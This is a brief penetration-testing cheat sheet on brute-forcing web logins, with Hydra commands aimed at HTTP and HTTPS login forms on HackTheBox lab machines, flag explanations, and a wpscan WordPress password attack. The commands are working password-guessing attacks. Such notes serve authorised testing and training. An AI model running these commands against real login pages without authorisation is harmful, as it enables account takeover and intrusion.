---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/password-attack/brute-force
---

# Brute-Force

## Web Login Form

```basic
# http
└─$ hydra -l 'admin' -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt nineveh.htb http-post-form '/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!'
```

* **-P:** specifies the file that contains the passwords.
* **http-post-form:** specifies an HTTP POST request.
* **“….”:** the content in the double quotes specifies the username/password parameters to be tested and the failed login message.

```basic
# https
└─$ hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect'
```

* `-l admin` (Must specify even no username parameter)
* `-P [password list]` list of password to bruteforce
* `10.10.10.43` specify IP or hostname
* `https-post-form` type of request for port 443
* `/db/index.php` path to POST the data
* `:password=^PASS^&remember=yes&login=Log+In&proc_login=true` data on POST
* `:Incorrect` text on the response that dedicate login failed

### BruteForce WordPress

```basic
wpscan --url $URL --disable-tls-checks -U Users -P cewl.txt
```
